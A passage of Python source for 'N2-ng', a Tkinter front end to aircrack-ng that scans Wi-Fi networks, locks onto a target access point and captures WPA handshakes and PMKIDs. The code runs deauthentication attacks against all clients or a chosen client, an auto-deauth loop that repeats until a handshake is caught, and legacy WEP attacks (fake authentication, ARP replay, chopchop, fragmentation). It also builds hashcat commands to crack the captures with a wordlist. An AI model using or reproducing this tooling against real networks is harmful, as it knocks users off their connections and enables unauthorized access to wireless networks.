        self.tree = ttk.Treeview(parent, columns=cols, show="headings", selectmode="browse")
        for c in cols:
            self.tree.heading(c, text=headings[c])
            self.tree.column(c, width=80, anchor=tk.CENTER)
        self.tree.column("essid", width=150)
        self.tree.column("bssid", width=130)
        if self.settings.get("show_manufacturers"):
            self.tree.column("mfg", width=120)

        vsb = ttk.Scrollbar(parent, orient=tk.VERTICAL, command=self.tree.yview)
        hsb = ttk.Scrollbar(parent, orient=tk.HORIZONTAL, command=self.tree.xview)
        self.tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        self.tree.grid(row=0, column=0, sticky="nsew")
        vsb.grid(row=0, column=1, sticky="ns")
        hsb.grid(row=1, column=0, sticky="ew")
        parent.grid_rowconfigure(0, weight=1)
        parent.grid_columnconfigure(0, weight=1)

        self.tree.bind("<Double-1>", self._on_network_double_click)
        self.tree.bind("<Button-3>", self._on_network_right_click)

    def _build_right_panel(self, parent):
        self.target_card = tk.LabelFrame(parent, text="Target", bg=THEME["panel"], fg=THEME["fg"])
        self.target_card.pack(fill=tk.X, padx=5, pady=5)
        self.target_label = tk.Label(self.target_card, text="No target locked", bg=THEME["panel"], fg=THEME["fg"], justify=tk.LEFT)
        self.target_label.pack(anchor=tk.W, padx=5, pady=5)
        self.size_label = tk.Label(self.target_card, text="Capture: 0 B", bg=THEME["panel"], fg=THEME["fg"])
        self.size_label.pack(anchor=tk.W, padx=5, pady=2)

        # Client table
        client_frame = tk.LabelFrame(parent, text="Clients", bg=THEME["panel"], fg=THEME["fg"])
        client_frame.pack(fill=tk.X, padx=5, pady=5)
        self.client_tree = ttk.Treeview(client_frame, columns=("station", "pwr", "pkts", "probed"), show="headings", height=5)
        for c, h in (("station", "STATION"), ("pwr", "PWR"), ("pkts", "Pkts"), ("probed", "Probed ESSID")):
            self.client_tree.heading(c, text=h)
            self.client_tree.column(c, width=90)
        self.client_tree.pack(fill=tk.X)

        # Signal graph
        self.signal_graph = SignalGraph(parent)

        # Attack panel
        self.attack_frame = tk.LabelFrame(parent, text="Attacks", bg=THEME["panel"], fg=THEME["fg"])
        self.attack_frame.pack(fill=tk.X, padx=5, pady=5)
        tk.Button(self.attack_frame, text="Deauthenticate All Clients", command=self._deauth_all, bg="#333333", fg=THEME["accent"], font=("TkDefaultFont", 11, "bold")).pack(fill=tk.X, padx=5, pady=3)
        tk.Button(self.attack_frame, text="Deauthenticate Specific Client", command=self._deauth_client, bg="#333333", fg=THEME["accent"], font=("TkDefaultFont", 11, "bold")).pack(fill=tk.X, padx=5, pady=3)

        self.legacy_visible = tk.BooleanVar(value=False)
        tk.Checkbutton(self.attack_frame, text="Show Legacy WEP Attacks", variable=self.legacy_visible, command=self._toggle_legacy, bg=THEME["panel"], fg=THEME["fg"], selectcolor=THEME["panel"]).pack(anchor=tk.W, padx=5)
        self.legacy_frame = tk.LabelFrame(self.attack_frame, text="Legacy WEP Attacks", bg=THEME["panel"], fg=THEME["fg"])
        for label, kind in (("Fake Authentication", "fakeauth"), ("ARP Replay", "arpreplay"), ("Chopchop", "chopchop"), ("Fragmentation", "fragmentation")):
            tk.Button(self.legacy_frame, text=label, command=lambda k=kind: self._legacy_attack(k), bg=THEME["panel"], fg=THEME["fg"]).pack(fill=tk.X, padx=5, pady=2)

        # Auto-deauth loop for handshake capture
        auto_frame = tk.LabelFrame(parent, text="Capture Handshake", bg=THEME["panel"], fg=THEME["fg"])
        auto_frame.pack(fill=tk.X, padx=5, pady=5)
        self.auto_deauth_var = tk.BooleanVar(value=False)
        tk.Checkbutton(auto_frame, text="Auto-deauth until handshake", variable=self.auto_deauth_var, command=self._toggle_auto_deauth, bg=THEME["panel"], fg=THEME["fg"], selectcolor=THEME["panel"]).pack(anchor=tk.W, padx=5)
        interval_frame = tk.Frame(auto_frame, bg=THEME["panel"])
        interval_frame.pack(anchor=tk.W, padx=5)
        tk.Label(interval_frame, text="Interval:", bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT)
        self.deauth_interval_var = tk.StringVar(value="10")
        tk.OptionMenu(interval_frame, self.deauth_interval_var, "10", "30", "60").pack(side=tk.LEFT)
        tk.Label(interval_frame, text="seconds", bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT)

        # Capture history
        hist_frame = tk.LabelFrame(parent, text="Capture History", bg=THEME["panel"], fg=THEME["fg"])
        hist_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.history_list = tk.Listbox(hist_frame, bg=THEME["bg"], fg=THEME["fg"], selectmode=tk.EXTENDED)
        self.history_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        hsb = tk.Scrollbar(hist_frame, command=self.history_list.yview)
        hsb.pack(side=tk.RIGHT, fill=tk.Y)
        self.history_list.config(yscrollcommand=hsb.set)
        self.history_list.bind("<Button-3>", self._on_history_right_click)
        tk.Button(hist_frame, text="Refresh", command=self._refresh_history, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.BOTTOM, fill=tk.X, pady=2)

    def _toggle_legacy(self):
        if self.legacy_visible.get():
            self.legacy_frame.pack(fill=tk.X, padx=5, pady=5)
        else:
            self.legacy_frame.pack_forget()

    def _build_log_pane(self):
        log_frame = tk.LabelFrame(self.root, text="Log", bg=THEME["panel"], fg=THEME["fg"], height=120)
        log_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=5, pady=(0, 5))
        log_frame.pack_propagate(False)
        self.log_text = tk.Text(log_frame, height=6, bg=THEME["bg"], fg=THEME["fg"], state=tk.DISABLED)
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        sb = tk.Scrollbar(log_frame, command=self.log_text.yview)
        sb.pack(side=tk.RIGHT, fill=tk.Y)
        self.log_text.config(yscrollcommand=sb.set)

    def _build_status_bar(self):
        self.status = tk.Label(self.root, text="Ready", bg=THEME["panel"], fg=THEME["fg"], anchor=tk.W)
        self.status.pack(side=tk.BOTTOM, fill=tk.X)

    # ------------------------------------------------------------------
    # Event handling
    # ------------------------------------------------------------------
    def _check_dependencies(self):
        missing = DependencyChecker.check_all()
        if missing:
            names = ", ".join(missing)
            msg = (
                f"Missing optional/required tools: {names}\n\n"
                "Install with:\n"
                "sudo apt update && sudo apt install -y aircrack-ng iw hcxtools reaver wireshark-common pcapfix\n\n"
                "Or build from source:\n"
                "https://github.com/aircrack-ng/aircrack-ng\n"
                "https://github.com/ZerBea/hcxtools\n"
                "https://github.com/t6x/reaver-wps-fork-t6x"
            )
            self._log(f"Missing dependencies: {names}")
            messagebox.showwarning("N2-ng Dependencies", msg)
        else:
            self._log("All dependencies satisfied")

    def _refresh_adapters(self):
        ifaces = self.airmon.list_physical_interfaces()
        menu = self.adapter_combo["menu"]
        menu.delete(0, tk.END)
        for iface in ifaces:
            menu.add_command(label=iface, command=lambda v=iface: self.adapter_var.set(v))
        if ifaces and not self.adapter_var.get():
            self.adapter_var.set(ifaces[0])

    def _start_monitor(self):
        iface = self.adapter_var.get()
        if not iface:
            messagebox.showwarning("N2-ng", "No adapter selected.")
            return
        self._log(f"Starting monitor mode on {iface}")
        try:
            self.mon_iface = self.airmon.start_monitor(iface)
            self.status.config(text=f"Monitor: {self.mon_iface}")
            self.pause_btn.config(text="Pause Scan")
            self.worker.start_scan(self.mon_iface, self.current_band.get(), "/tmp/n2ng_scan")
        except Exception as e:
            messagebox.showerror("N2-ng", f"Failed to start monitor mode: {e}")

    def _stop_monitor(self):
        self.worker.stop()
        if self.mon_iface:
            self.airmon.stop_monitor(self.mon_iface)
            self.mon_iface = None
        self.status.config(text="Monitor stopped")
        self.channel_pill.config(text="SCANNING ALL", bg="red")
        self.pause_btn.config(text="Pause Scan")

    def _wps_scan(self):
        if not self.mon_iface:
            messagebox.showwarning("N2-ng", "Start monitor mode first.")
            return
        self._log("Starting WPS scan...")
        self.wps_lines = []
        self.wps_dialog = tk.Toplevel(self.root)
        self.wps_dialog.title("WPS Scan")
        self.wps_dialog.configure(bg=THEME["bg"])
        self.wps_dialog.geometry("700x400")
        text = tk.Text(self.wps_dialog, bg=THEME["bg"], fg=THEME["fg"], state=tk.DISABLED)
        text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.wps_text = text
        self.wps_scanner = WpsScanner(self.mon_iface, self._on_wps_event)
        self.wps_scanner.start()
        tk.Button(self.wps_dialog, text="Stop", command=self._stop_wps_scan, bg=THEME["panel"], fg=THEME["fg"]).pack(pady=5)

    def _on_wps_event(self, event, payload):
        if event == "wps_line":
            self.wps_lines.append(payload)
            self.root.after(0, self._update_wps_text)
        elif event == "error":
            self._log(f"WPS scan error: {payload}")

    def _update_wps_text(self):
        if hasattr(self, "wps_text") and self.wps_text.winfo_exists():
            self.wps_text.config(state=tk.NORMAL)
            self.wps_text.delete("1.0", tk.END)
            self.wps_text.insert(tk.END, "\n".join(self.wps_lines[-200:]))
            self.wps_text.see(tk.END)
            self.wps_text.config(state=tk.DISABLED)

    def _stop_wps_scan(self):
        if hasattr(self, "wps_scanner"):
            self.wps_scanner.stop()
        if hasattr(self, "wps_dialog") and self.wps_dialog.winfo_exists():
            self.wps_dialog.destroy()

    def _open_settings(self):
        SettingsDialog(self.root, self.settings, self._apply_settings)

    def _apply_settings(self):
        self._log("Settings applied")
        # Rebuild tree if manufacturer column visibility changed
        self._rebuild_tree_if_needed()
        # Refresh tree to apply sort/filter
        self._refresh_tree()
        # Restart airodump if running so new flags take effect
        if self.worker._last_cmd and self.mon_iface:
            self.worker.restart_with_settings()
            self._log("Restarted airodump-ng with new settings")

    def _rebuild_tree_if_needed(self):
        # Determine if manufacturer column state changed
        has_mfg = self.settings.get("show_manufacturers")
        current_cols = self.tree["columns"]
        has_mfg_col = "mfg" in current_cols
        if has_mfg != has_mfg_col:
            # Rebuild treeview
            parent = self.tree.master
            self.tree.destroy()
            self._build_network_tree(parent)

    def _toggle_pause(self):
        if not self.worker._proc:
            return
        if self.worker.is_paused():
            self.worker.resume()
            self.pause_btn.config(text="Pause Scan")
            self._log("Scan resumed")
        else:
            self.worker.pause()
            self.pause_btn.config(text="Resume Scan")
            self._log("Scan paused")

    def _toggle_auto_deauth(self):
        if self.auto_deauth_var.get():
            if not self.locked_target or not self.mon_iface:
                messagebox.showwarning("N2-ng", "Lock a target first.")
                self.auto_deauth_var.set(False)
                return
            self._log("Auto-deauth loop started")
            self._auto_deauth_tick()
        else:
            self._log("Auto-deauth loop stopped")

    def _auto_deauth_tick(self):
        if not self.auto_deauth_var.get() or not self.locked_target or not self.mon_iface:
            return
        if self.capture_manager and (self.capture_manager.handshake_found or self.capture_manager.pmkid_found):
            self._log("Handshake/PMKID captured, stopping auto-deauth")
            self.auto_deauth_var.set(False)
            return
        bssid = self.locked_target["bssid"]
        self.attack.deauth_all(bssid, self.mon_iface, count=5)
        interval = int(self.deauth_interval_var.get()) * 1000
        self.root.after(interval, self._auto_deauth_tick)

    def _on_network_double_click(self, event):
        item = self.tree.selection()
        if not item:
            return
        bssid = self.tree.item(item[0], "values")[-1]
        self._lock_target(bssid)

    def _on_network_right_click(self, event):
        item = self.tree.identify_row(event.y)
        if not item:
            return
        self.tree.selection_set(item)
        bssid = self.tree.item(item, "values")[-1]
        essid = self.tree.item(item, "values")[-2]
        menu = tk.Menu(self.root, tearoff=0, bg=THEME["panel"], fg=THEME["fg"])
        menu.add_command(label="Copy BSSID", command=lambda: self._copy_to_clipboard(bssid))
        menu.add_command(label="Copy ESSID", command=lambda: self._copy_to_clipboard(essid))
        menu.add_command(label="Lock Target", command=lambda: self._lock_target(bssid))
        menu.post(event.x_root, event.y_root)

    def _copy_to_clipboard(self, text: str):
        self.root.clipboard_clear()
        self.root.clipboard_append(text)

    def _lock_target(self, bssid: str):
        net = self.networks.get(bssid)
        if not net:
            return
        if not self.mon_iface:
            messagebox.showwarning("N2-ng", "Start monitor mode first.")
            return
        self.locked_target = net
        ch = net.get("channel", "1")
        # Set system channel to prevent aireplay-ng mismatch
        subprocess.run(["iw", "dev", self.mon_iface, "set", "channel", str(ch)], capture_output=True)
        base = user_home() / "hs" / "n2-ng" / sanitize_essid(net["essid"], bssid)
        base.mkdir(parents=True, exist_ok=True)
        prefix = str(base / f"capture_{time.strftime('%Y-%m-%d_%H-%M-%S')}")
        self.worker.start_lock(self.mon_iface, int(ch), bssid, prefix)
        self.capture_manager.set_active_cap(Path(f"{prefix}-01.cap"))
        self._poll_capture()
        self.channel_pill.config(text=f"LOCKED: CH {ch}", bg="green")
        self._update_target_card(net)
        self._log(f"Locked target {net['essid']} ({bssid}) on channel {ch}")
        self._start_capture_size_monitor()
        self._refresh_history()

    def _unlock_target(self):
        self.locked_target = None
        self.channel_pill.config(text="SCANNING ALL", bg="red")
        self.target_label.config(text="No target locked")
        self.size_label.config(text="Capture: 0 B")
        self.client_tree.delete(*self.client_tree.get_children())
        self.worker.stop()
        if self.mon_iface:
            self.worker.start_scan(self.mon_iface, self.current_band.get(), "/tmp/n2ng_scan")

    def _update_target_card(self, net: dict):
        lines = [
            f"ESSID: {net.get('essid', '[Hidden]')}",
            f"BSSID: {net['bssid']}",
            f"Channel: {net.get('channel', '')}",
            f"Power: {net.get('power', '')} dBm",
            f"Privacy: {net.get('privacy', '')} / {net.get('cipher', '')} / {net.get('auth', '')}",
        ]
        self.target_label.config(text="\n".join(lines))

    def _start_capture_size_monitor(self):
        if not self.locked_target:
            return
        # Find the latest .cap in the target directory
        base = user_home() / "hs" / "n2-ng" / sanitize_essid(self.locked_target["essid"], self.locked_target["bssid"])
        caps = sorted(base.glob("*.cap"))
        if caps:
            size = caps[-1].stat().st_size
            self.size_label.config(text=f"Capture: {human_size(size)}")
        if self.locked_target:
            self.root.after(1000, self._start_capture_size_monitor)

    def _poll_capture(self):
        if self.capture_manager:
            self.capture_manager.poll()
        if self.locked_target:
            self.root.after(5000, self._poll_capture)

    # ------------------------------------------------------------------
    # Attack handlers
    # ------------------------------------------------------------------
    def _our_mac(self) -> str | None:
        try:
            out = subprocess.check_output(["ip", "link", "show", self.mon_iface], text=True, stderr=subprocess.DEVNULL)
            m = re.search(r"link/ether\s+([0-9a-f:]{17})", out)
            if m:
                return m.group(1).upper()
        except Exception:
            pass
        return None

    def _confirm_attack(self, cmd: list[str]) -> bool:
        dlg = CountdownDialog(self.root, cmd)
        self.root.wait_window(dlg)
        return dlg.result

    def _deauth_all(self):
        if not self.locked_target or not self.mon_iface:
            messagebox.showwarning("N2-ng", "Lock a target first.")
            return
        bssid = self.locked_target["bssid"]
        cmd = ["aireplay-ng", "-0", "10", "-a", bssid, self.mon_iface]
        if self._confirm_attack(cmd):
            self.attack.deauth_all(bssid, self.mon_iface, count=10)

    def _deauth_client(self):
        if not self.locked_target or not self.mon_iface:
            messagebox.showwarning("N2-ng", "Lock a target first.")
            return
        item = self.client_tree.selection()
        if not item:
            messagebox.showwarning("N2-ng", "Select a client from the table.")
            return
        client = self.client_tree.item(item[0], "values")[0]
        bssid = self.locked_target["bssid"]
        cmd = ["aireplay-ng", "-0", "10", "-a", bssid, "-c", client, self.mon_iface]
        if self._confirm_attack(cmd):
            self.attack.deauth_client(bssid, client, self.mon_iface, count=10)

    def _legacy_attack(self, kind: str):
        if not self.locked_target or not self.mon_iface:
            messagebox.showwarning("N2-ng", "Lock a target first.")
            return
        our_mac = self._our_mac()
        if not our_mac:
            messagebox.showwarning("N2-ng", "Could not determine our MAC address.")
            return
        bssid = self.locked_target["bssid"]
        flag = {"fakeauth": "-1", "arpreplay": "-3", "chopchop": "-4", "fragmentation": "-5"}[kind]
        if kind == "fakeauth":
            cmd = ["aireplay-ng", flag, "0", "-a", bssid, "-h", our_mac, self.mon_iface]
        else:
            cmd = ["aireplay-ng", flag, "-b", bssid, "-h", our_mac, self.mon_iface]
        if self._confirm_attack(cmd):
            self.attack.legacy_attack(kind, bssid, our_mac, self.mon_iface)

    # ------------------------------------------------------------------
    # Queue / network updates
    # ------------------------------------------------------------------
    def _poll_queue(self):
        """Loop B: fixed-rate display refresh, independent of capture.

        Reads the latest parsed data from the worker's shared buffer and
        re-renders the UI at ~6.7 FPS.  One-off events (handshake/pmkid/
        errors) are drained from the queue without blocking on capture.
        """
        # Always refresh display from the shared buffer.
        if self.worker:
            networks, clients = self.worker.get_latest()
            self._update_networks(networks)
            self._update_clients(clients)

        # Drain asynchronous events.
        while not self.queue.empty():
            try:
                event, payload = self.queue.get_nowait()
            except queue.Empty:
                break
            if event == "handshake":
                self._notify_capture("WPA Handshake Captured", payload["file"])
            elif event == "pmkid":
                self._notify_capture("PMKID Captured", payload["file"])
            elif event == "error":
                self._log(f"ERROR: {payload}")
        self.poll_id = self.root.after(150, self._poll_queue)

    def _notify_capture(self, title: str, path: str):
        self.status.config(text=f"{title}: {path}", bg="green", fg="black")
        self._log(f"{title}: {path}")
        messagebox.showinfo(title, f"{title}\n\nFile: {path}")
        self._refresh_history()

    def _refresh_history(self):
        self.history_list.delete(0, tk.END)
        base = user_home() / "hs" / "n2-ng"
        if not base.exists():
            return
        for cap in sorted(base.rglob("*.cap")):
            self.history_list.insert(tk.END, str(cap))

    def _on_history_right_click(self, event):
        idx = self.history_list.nearest(event.y)
        if idx < 0:
            return
        self.history_list.selection_clear(0, tk.END)
        self.history_list.selection_set(idx)
        cap_path = Path(self.history_list.get(idx))
        menu = tk.Menu(self.root, tearoff=0, bg=THEME["panel"], fg=THEME["fg"])
        menu.add_command(label="Copy hashcat command", command=lambda: self._copy_hashcat_cmd(cap_path))
        menu.add_command(label="Copy .22000 content", command=lambda: self._copy_22000(cap_path))
        menu.add_command(label="Fix capture", command=lambda: self._fix_capture(cap_path))
        menu.add_command(label="Merge selected", command=self._merge_selected)
        menu.post(event.x_root, event.y_root)

    def _copy_hashcat_cmd(self, cap: Path):
        hash22000 = cap.with_suffix(".22000")
        if not hash22000.exists():
            converted = self.capture_manager.convert(cap) if self.capture_manager else None
            if not converted:
                messagebox.showwarning("N2-ng", "No .22000 file found and conversion failed.")
                return
            hash22000 = converted
        cmd = f"hashcat -m 22000 {hash22000} /usr/share/wordlists/rockyou.txt"
        self._copy_to_clipboard(cmd)
        self._log(f"Copied hashcat command for {cap.name}")

    def _copy_22000(self, cap: Path):
        hash22000 = cap.with_suffix(".22000")
        if not hash22000.exists():
            converted = self.capture_manager.convert(cap) if self.capture_manager else None
            if not converted:
                messagebox.showwarning("N2-ng", "No .22000 file found and conversion failed.")
                return
            hash22000 = converted
        text = hash22000.read_text(errors="ignore")
        self._copy_to_clipboard(text)
        self._log(f"Copied .22000 content for {cap.name}")

    def _fix_capture(self, cap: Path):
        if not self.capture_manager:
            return
        fixed = self.capture_manager.fix(cap)
        if fixed:
            messagebox.showinfo("N2-ng", f"Fixed capture saved to:\n{fixed}")
            self._log(f"Fixed {cap.name} -> {fixed.name}")
            self._refresh_history()
        else:
            messagebox.showwarning("N2-ng", "pcapfix failed or not installed.")

    def _merge_selected(self):
        indices = self.history_list.curselection()
        if len(indices) < 2:
            messagebox.showwarning("N2-ng", "Select at least two captures to merge.")
            return
        caps = [Path(self.history_list.get(i)) for i in indices]
        out = caps[0].with_suffix(".merged.cap")
        if self.capture_manager and self.capture_manager.merge(caps, out):
            messagebox.showinfo("N2-ng", f"Merged capture saved to:\n{out}")
            self._log(f"Merged {len(caps)} captures -> {out.name}")
            self._refresh_history()
        else:
            messagebox.showwarning("N2-ng", "mergecap failed or not installed.")

    def _update_clients(self, clients: list[dict]):
        self.clients = clients
        self.client_tree.delete(*self.client_tree.get_children())
        if self.locked_target:
            bssid = self.locked_target["bssid"]
            for c in clients:
                if c.get("bssid") == bssid or c.get("bssid") == "(not associated)":
                    self.client_tree.insert(
                        "", tk.END,
                        values=(c.get("station", ""), c.get("power", ""), c.get("packets", ""), c.get("probed", "")),
                    )

    def _update_networks(self, networks: list[dict]):
        for net in networks:
            bssid = net["bssid"]
            old = self.networks.get(bssid)
            if old and old.get("essid") == "[Hidden]" and net.get("essid") and net.get("essid") != "[Hidden]":
                self._log(f"Revealed hidden ESSID: {net['essid']} ({bssid})")
            self.networks[bssid] = net
            if self.locked_target and self.locked_target["bssid"] == bssid:
                self.locked_target = net
                self._update_target_card(net)
                self.signal_graph.add_sample(net.get("power", -100))
        self._refresh_tree()

    def _filter_networks(self, networks: list[dict]) -> list[dict]:
        filt = self.settings.get("filter_encryption")
        if filt == "All":
            return networks
        result = []
        for net in networks:
            p = net.get("privacy", "").upper()
            if filt == "WEP only" and "WEP" in p:
                result.append(net)
            elif filt == "WPA/WPA2 only" and ("WPA" in p or "WPA2" in p) and "WPA3" not in p:
                result.append(net)
            elif filt == "WPA3 only" and "WPA3" in p:
                result.append(net)
            elif filt == "Open only" and (not p or p == "OPN"):
                result.append(net)
        return result

    def _sort_networks(self, networks: list[dict]) -> list[dict]:
        sort_key = self.settings.get("sort_by")
        key_map = {
            "PWR": "power",
            "Beacons": "beacons",
            "#Data": "iv",
            "CH": "channel",
            "ESSID": "essid",
            "BSSID": "bssid",
        }
        col = key_map.get(sort_key, "power")
        reverse = True
        if col in ("essid", "bssid"):
            reverse = False

        def sort_val(net):
            raw = net.get(col, "")
            if col in ("power", "beacons", "iv", "channel"):
                try:
                    return int(raw)
                except (TypeError, ValueError):
                    return -9999
            return str(raw).lower()

        return sorted(networks, key=sort_val, reverse=reverse)

    def _network_values(self, net: dict) -> tuple:
        if self.settings.get("show_manufacturers"):
            return (
                net.get("power", ""), net.get("beacons", ""), net.get("iv", ""),
                net.get("channel", ""), net.get("speed", ""), net.get("privacy", ""),
                net.get("cipher", ""), net.get("auth", ""), net.get("manufacturer", ""),
                net.get("essid", ""), net["bssid"],
            )
        return (
            net.get("power", ""), net.get("beacons", ""), net.get("iv", ""),
            net.get("channel", ""), net.get("speed", ""), net.get("privacy", ""),
            net.get("cipher", ""), net.get("auth", ""), net.get("essid", ""), net["bssid"],
        )

    def _refresh_tree(self):
        # Refresh the tree in-place to avoid full rebuild flicker at 6-7 FPS.
        selected = set(self.tree.selection())
        networks = list(self.networks.values())
        networks = self._filter_networks(networks)
        networks = self._sort_networks(networks)
        wanted = {net["bssid"] for net in networks}

        # Remove rows that no longer pass filter/sort.
        for iid in list(self.tree.get_children()):
            if iid not in wanted:
                self.tree.delete(iid)

        # Insert new or update existing rows.
        for net in networks:
            bssid = net["bssid"]
            values = self._network_values(net)
            tag = self._privacy_tag(net.get("privacy", ""))
            if self.tree.exists(bssid):
                self.tree.item(bssid, values=values, tags=(tag,))
            else:
                self.tree.insert("", tk.END, iid=bssid, values=values, tags=(tag,))

        # Restore selection if item still exists.
        for bssid in selected:
            if self.tree.exists(bssid):
                self.tree.selection_add(bssid)

        # Color config
        self.tree.tag_configure("OPN", foreground="#00ff41")
        self.tree.tag_configure("WEP", foreground="#ff4444")
        self.tree.tag_configure("WPA", foreground="#ffcc00")
        self.tree.tag_configure("WPA2", foreground="#ffffff")
        self.tree.tag_configure("WPA3", foreground="#00ccff")

    @staticmethod
    def _privacy_tag(privacy: str) -> str:
        p = privacy.upper()
        if "WPA3" in p:
            return "WPA3"
        if "WPA2" in p:
            return "WPA2"
        if "WPA" in p:
            return "WPA"
        if "WEP" in p:
            return "WEP"
        return "OPN"

    def _log(self, msg: str):
        ts = time.strftime("%H:%M:%S")
        if hasattr(self, "log_text") and self.log_text.winfo_exists():
            self.log_text.config(state=tk.NORMAL)
            self.log_text.insert(tk.END, f"[{ts}] {msg}\n")
            self.log_text.see(tk.END)
            self.log_text.config(state=tk.DISABLED)
        # Also mirror to stdout for debugging
        print(f"[{ts}] {msg}")

    # ------------------------------------------------------------------
    # Cleanup
    # ------------------------------------------------------------------
    def _on_close(self):
        self._cleanup()
        self.root.destroy()

    def _cleanup(self):
        if self.poll_id:
            self.root.after_cancel(self.poll_id)
            self.poll_id = None
        self.worker.stop()
        self.airmon.cleanup()

    def run(self):
        self.root.mainloop()


def ensure_root():
    if os.geteuid() == 0:
        return
    root = tk.Tk()
    root.withdraw()
    pwd = simpledialog.askstring(
        "N2-ng requires root",
        "Enter sudo password:",
        show="*",
        parent=root,
    )
    root.destroy()
    if not pwd:
        messagebox.showerror("N2-ng", "Root privileges are required.")
        sys.exit(1)
    script = os.path.abspath(sys.argv[0])
    args = ["sudo", "-S", sys.executable, script] + sys.argv[1:]
    proc = subprocess.Popen(
        args,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    out, err = proc.communicate(input=pwd + "\n")
    sys.stdout.write(out)
    sys.stderr.write(err)
    sys.exit(proc.returncode)


if __name__ == "__main__":
    ensure_root()
    root = tk.Tk()
    app = N2NgApp(root)
    app.run()
